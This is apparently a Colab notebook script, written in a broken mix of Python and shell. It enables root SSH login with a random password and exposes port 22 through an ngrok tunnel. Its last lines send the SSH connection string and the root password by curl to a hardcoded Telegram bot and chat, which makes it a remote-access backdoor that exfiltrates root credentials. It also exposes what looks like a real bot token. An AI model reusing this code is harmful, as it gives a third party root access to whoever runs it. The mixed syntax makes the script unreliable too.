import random, string, urllib.request, json
authtoken = $1
password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip -qq -n ngrok-stable-linux-amd64.zip
apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null
echo root:$password | chpasswd
mkdir -p /var/run/sshd
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc 
echo "export LD_LIBRARY_PATH" >> /root/.bashrc
get_ipython().system_raw('/usr/sbin/sshd -D &')
get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')
response = urllib.request.urlopen('http://localhost:4040/api/tunnels')
data = json.loads(response.read().decode())
(host, port) = data['tunnels'][0]['public_url'][6:].split(':')
idssh = f'ssh -p{port} root@{host}'
curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={idssh}' 
curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={password}'
